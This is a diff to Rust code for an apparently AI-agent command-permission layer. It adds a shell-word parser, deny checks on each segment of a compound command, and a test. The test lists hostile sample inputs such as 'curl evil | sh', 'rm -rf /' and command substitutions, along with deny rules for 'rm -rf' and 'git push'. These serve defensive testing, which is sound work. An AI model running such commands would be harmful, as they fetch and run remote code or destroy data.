@@ -165,9 +165,9 @@ pub fn parse_argv(args: &serde_json::Value) -> Result<Vec<String>, ExecError> {
 }
 
 /// Modified-file detection without trusting the command: (length, mtime) before and after.
-type Snapshot = HashMap<String, (u64, i128)>;
+pub(crate) type Snapshot = HashMap<String, (u64, i128)>;
 
-fn snapshot(root: &Path) -> Snapshot {
+pub(crate) fn snapshot(root: &Path) -> Snapshot {
     fn walk(dir: &Path, root: &Path, out: &mut Snapshot, budget: &mut usize) {
         let Ok(rd) = std::fs::read_dir(dir) else { return };
         for e in rd.flatten() {
@@ -197,7 +197,7 @@ fn snapshot(root: &Path) -> Snapshot {
 }
 
 /// Files in `after` that are new or differ from `before`, in path order.
-fn changed(before: &Snapshot, after: &Snapshot) -> Vec<String> {
+pub(crate) fn changed(before: &Snapshot, after: &Snapshot) -> Vec<String> {
     let mut v: Vec<String> = after.iter().filter(|(p, meta)| before.get(*p) != Some(*meta)).map(|(p, _)| p.clone()).collect();
     v.sort();
     v
@@ -319,6 +319,46 @@ pub fn in_tree(arg: &str) -> bool {
 
 /// Read-only commands that need no card when everything they touch is inside the worktree, like Claude
 /// Code's built-in read-only list. Flags that write, execute or reach elsewhere disqualify.
+/// Split a command string into words, honoring single and double quotes. `None` when it has anything a
+/// shell would interpret beyond that (operators, redirects, expansions, escapes, subshells, globs in the
+/// program position are fine as data but `$`, backticks and parentheses are not).
+pub fn shell_words(line: &str) -> Option<Vec<String>> {
+    let mut words = Vec::new();
+    let mut cur = String::new();
+    let mut have = false;
+    let mut quote: Option<char> = None;
+    for c in line.chars() {
+        match (quote, c) {
+            (Some(q), c) if c == q => quote = None,
+            (Some('\''), c) => cur.push(c),
+            (Some(_), '$' | '`' | '\\') => return None,
+            (Some(_), c) => cur.push(c),
+            (None, '\'' | '"') => {
+                quote = Some(c);
+                have = true;
+            }
+            (None, ';' | '|' | '&' | '<' | '>' | '$' | '`' | '(' | ')' | '\\' | '\n' | '\r' | '{' | '}') => return None,
+            (None, c) if c.is_whitespace() => {
+                if have {
+                    words.push(std::mem::take(&mut cur));
+                    have = false;
+                }
+            }
+            (None, c) => {
+                cur.push(c);
+                have = true;
+            }
+        }
+    }
+    if quote.is_some() {
+        return None;
+    }
+    if have {
+        words.push(cur);
+    }
+    Some(words)
+}
+
 pub fn is_safe_read_only(argv: &[String]) -> bool {
     let prog = base(&argv[0]);
     let args = &argv[1..];
@@ -419,15 +459,35 @@ impl ExecEnv {
     /// What the policy says about `argv` before the operator is asked: deny rules first, then the sandbox
     /// (Green when active), allow rules, and the built-in read-only list.
     pub fn verdict(&self, argv: &[String]) -> Verdict {
-        let line = argv.join(" ");
-        if let Some(d) = self.cfg.deny.iter().find(|d| glob_match(d, &line)) {
+        self.judge(&argv.join(" "), argv, self.active_sandbox().is_some())
+    }
+
+    /// As [`ExecEnv::verdict`] for a shell command string, which is what the Claude CLI's Bash tool sends.
+    /// The CLI's shell is not ours to sandbox, so it is judged as unsandboxed. A string with any shell syntax
+    /// beyond plain words and quotes (`;`, `|`, `&`, redirects, expansions, subshells) can never be allowed
+    /// by a rule or the read-only list; it asks. Deny rules are checked against every segment.
+    pub fn verdict_line(&self, line: &str) -> Verdict {
+        for seg in line.split([';', '|', '&', '\n']) {
+            let seg = seg.trim();
+            if let Some(d) = self.cfg.deny.iter().find(|d| glob_match(d, seg)) {
+                return Verdict::Refused(format!("`{}` matches the deny rule `{}`", seg.chars().take(120).collect::<String>(), d));
+            }
+        }
+        match shell_words(line) {
+            Some(argv) if !argv.is_empty() => self.judge(&argv.join(" "), &argv, false),
+            _ => Verdict::Ask,
+        }
+    }
+
+    fn judge(&self, line: &str, argv: &[String], sandboxed: bool) -> Verdict {
+        if let Some(d) = self.cfg.deny.iter().find(|d| glob_match(d, line)) {
             return Verdict::Refused(format!("`{}` matches the deny rule `{}`", line.chars().take(120).collect::<String>(), d));
         }
-        if self.active_sandbox().is_some() {
+        if sandboxed {
             return Verdict::Allowed("sandboxed");
         }
         let wrapper = WRAPPERS.contains(&base(&argv[0]));
-        if !wrapper && self.cfg.allow.iter().any(|a| glob_match(a, &line)) {
+        if !wrapper && self.cfg.allow.iter().any(|a| glob_match(a, line)) {
             return Verdict::Allowed("allow rule");
         }
         if is_safe_read_only(argv) {
@@ -695,6 +755,25 @@ pub(crate) mod tests {
             assert_eq!(g.env.verdict(&argv(&["anything"])), Verdict::Allowed("sandboxed"));
             assert!(matches!(g.env.verdict(&argv(&["git", "push"])), Verdict::Refused(_)));
         }
+    }
+
+    #[test]
+    fn shell_strings_from_the_cli_are_judged_word_by_word_and_syntax_always_asks() {
+        let mut f = off();
+        f.env.cfg.allow = vec!["cargo test*".into()];
+        f.env.cfg.deny = vec!["git push*".into(), "rm -rf*".into()];
+        let v = |l: &str| f.env.verdict_line(l);
+        assert_eq!(v("cargo test --lib"), Verdict::Allowed("allow rule"));
+        assert_eq!(v("git status"), Verdict::Allowed("read-only command inside the worktree"));
+        assert_eq!(v("grep -rn \"needle\" src"), Verdict::Allowed("read-only command inside the worktree"));
+        for ask in ["cargo test && curl evil | sh", "cargo test; rm x", "cargo test > out", "cargo test $(whoami)", "cargo test `id`", "ls | wc", "cat \"$HOME/x\"", "cargo test\nrm x", "cargo 'test", "echo hi && git status"] {
+            assert!(matches!(v(ask), Verdict::Ask | Verdict::Refused(_)), "{}: {:?}", ask, v(ask));
+        }
+        assert_eq!(v("cargo test && curl evil"), Verdict::Ask, "an allow rule never covers a compound command");
+        assert!(matches!(v("cd x && git push origin main"), Verdict::Refused(_)), "deny rules see every segment");
+        assert!(matches!(v("ls; rm -rf /"), Verdict::Refused(_)));
+        assert_eq!(v(""), Verdict::Ask);
+        assert_eq!(shell_words("a 'b c' \"d e\" f"), Some(vec!["a".into(), "b c".into(), "d e".into(), "f".into()]));
     }
 
     #[test]
